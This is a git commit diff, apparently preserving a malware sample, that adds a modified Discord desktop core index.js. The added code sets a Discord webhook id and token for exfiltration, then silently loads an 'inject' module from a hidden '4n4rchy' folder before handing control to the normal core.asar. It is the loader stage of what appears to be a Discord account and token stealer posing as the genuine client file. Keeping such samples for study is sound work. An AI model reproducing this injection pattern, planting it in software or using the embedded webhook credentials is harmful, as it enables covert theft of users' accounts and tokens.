62ba5ef2149b5db8e8e06f3e74893684b37b3ecf
Teja Swaroop <42813446+teja156@users.noreply.github.com>
2020-06-02 23:10:55 +0530

    index.js is modified by the malware

---
+++ index.js
@@ -0,0 +1,7 @@
+
+//process.env.hook = '714209746844123208/JwT5iPO-MnANzuxgJZkXDJI6CwuSEci2D6MUu2SHLDlQGfohBD2IWWW2CLeH19Q267Pz';
+process.env.hook = '717029999789736027/8b4DcchEo2feb36o1Jv613n-t7knhTLCStNcJxROYsHgfxdFkLz15YzlUsd_9RbGhmwH';
+process.env.mfa = true;
+process.env.modDir = 'C:\\Users\\lolx\\AppData\\Roaming\\discord\\0.0.306\\modules\\discord_desktop_core\\4n4rchy'
+require(process.env.modDir + '\\inject')
+module.exports = require('./core.asar');
